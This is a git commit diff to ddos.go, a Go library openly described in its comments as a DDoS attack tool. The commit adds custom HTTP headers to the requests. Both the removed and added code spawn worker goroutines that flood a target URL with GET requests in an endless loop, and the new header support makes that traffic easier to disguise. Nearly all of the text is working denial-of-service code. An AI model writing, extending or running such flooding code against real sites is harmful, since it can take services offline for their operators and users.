185a4cfabf854c3503f26fc4d38719423499bbe0
mengyyy <mengyyy@users.noreply.github.com>
2018-04-09 09:01:58 +0800

    add headers

--- ddos.go
+++ ddos.go
@@ -13,6 +13,8 @@ import (
 // DDoS - structure of value for DDoS attack
 type DDoS struct {
 	url           string
+        headers       map[string]string
+	request       *http.Request
 	stop          *chan bool
 	amountWorkers int
 
@@ -22,44 +24,55 @@ type DDoS struct {
 }
 
 // New - initialization of new DDoS attack
-func New(URL string, workers int) (*DDoS, error) {
-	if workers < 1 {
-		return nil, fmt.Errorf("Amount of workers cannot be less 1")
-	}
-	u, err := url.Parse(URL)
-	if err != nil || len(u.Host) == 0 {
-		return nil, fmt.Errorf("Undefined host or error = %v", err)
-	}
-	s := make(chan bool)
-	return &DDoS{
-		url:           URL,
-		stop:          &s,
-		amountWorkers: workers,
-	}, nil
+func New(URL string, workers int, headers map[string]string) (*DDoS, error) {
+    if workers < 1 {
+        return nil, fmt.Errorf("Amount of workers cannot be less 1")
+    }
+    u, err := url.Parse(URL)
+    if err != nil || len(u.Host) == 0 {
+        return nil, fmt.Errorf("Undefined host or error = %v", err)
+    }
+    // add headers
+    req, err := http.NewRequest("GET", URL, nil)
+    if err != nil {
+        return nil, fmt.Errorf("Build request failed = %v", err)
+    }
+    for k, v := range headers {
+        req.Header.Add(k, v)
+    }
+    
+    s := make(chan bool)
+    return &DDoS{
+        url:           URL,
+        request:       req,
+        stop:          &s,
+        amountWorkers: workers,
+    }, nil
 }
 
 // Run - run DDoS attack
 func (d *DDoS) Run() {
-	for i := 0; i < d.amountWorkers; i++ {
-		go func() {
-			for {
-				select {
-				case <-(*d.stop):
-					return
-				default:
-					// sent http GET requests
-					resp, err := http.Get(d.url)
-					atomic.AddInt64(&d.amountRequests, 1)
-					if err == nil {
-						atomic.AddInt64(&d.successRequest, 1)
-						_, _ = io.Copy(ioutil.Discard, resp.Body)
-						_ = resp.Body.Close()
-					}
-				}
-				runtime.Gosched()
-			}
-		}()
-	}
+    for i := 0; i < d.amountWorkers; i++ {
+        go func() {
+            for {
+                select {
+                case <-(*d.stop):
+                    return
+                default:
+                    // sent http GET requests
+                    client := &http.Client{}
+                    resp, err := client.Do(d.request) //提交
+                    atomic.AddInt64(&d.amountRequests, 1)
+                    if err == nil {
+                        atomic.AddInt64(&d.successRequest, 1)
+                        _, _ = io.Copy(ioutil.Discard, resp.Body)
+                        resp.Body.Close()
+                    }
+                }
+                runtime.Gosched()
+            }
+        }()
+    }
 }
 
 // Stop - stop DDoS attack
